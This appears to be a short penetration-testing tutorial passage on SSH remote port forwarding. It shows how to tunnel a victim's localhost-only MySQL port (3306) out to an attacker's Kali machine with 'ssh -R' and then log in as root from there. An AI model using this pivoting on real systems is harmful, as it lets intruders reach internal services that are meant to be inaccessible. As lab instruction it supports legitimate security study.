In some instances, a root process may be bound to an internal port, through which it communicates.

If for some reason, an exploit cannot run locally on the target machine, the port can be forwarded using SSH to your local machine:

```bash - kali
ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
```

The exploit code can now be run on your local machine at whichever port you chose.

First, let's discover the port mysql is running on:

```bash - kali
ss -antp
```

OR

```bash - kali
netstat -nl
```

`tcp 0 127.0.0.1:3306 0.0.0.0:* LISTEN`

It is running on its default port, 3306. Notice is bound to local address, meaning we cannot access it externally.

In Kali:

```bash - kali
service ssh start
```

In Victim:
```bash - victim
ssh -R 4444:127.0.0.1:3306 kali@192.168.205.132
```

In Kali:
```bash - kali
mysql -u root -h 127.0.0.1 -P 4444
```
